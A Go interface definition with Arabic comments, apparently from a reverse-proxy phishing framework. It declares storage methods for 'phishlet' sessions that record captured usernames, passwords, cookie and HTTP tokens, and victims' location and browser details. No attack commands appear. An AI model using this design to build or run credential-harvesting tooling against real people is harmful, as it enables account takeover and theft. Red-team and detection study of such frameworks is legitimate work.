package database

// IDatabase هي واجهة تحدد عمليات قاعدة البيانات المطلوبة
// كل تنفيذات قاعدة البيانات (BuntDB, MongoDB) يجب أن تنفذ هذه الواجهة
type IDatabase interface {
	// الأساسيات
	Close() error
	Flush()

	// إدارة الجلسات
	CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error
	ListSessions() ([]*Session, error)
	GetSessionById(id int) (*Session, error)
	GetSessionBySid(sid string) (*Session, error)
	DeleteSession(sid string) error
	DeleteSessionById(id int) error

	// تحديث بيانات الجلسة
	SetSessionUsername(sid string, username string) error
	SetSessionPassword(sid string, password string) error
	SetSessionCustom(sid string, name string, value string) error
	SetSessionBodyTokens(sid string, tokens map[string]string) error
	SetSessionHttpTokens(sid string, tokens map[string]string) error
	SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error
	SetSessionCountryInfo(sid string, countryCode string, country string) error
	SetSessionCityInfo(sid string, city string) error
	SetSessionBrowserInfo(sid string, browser string, deviceType string, os string) error
} 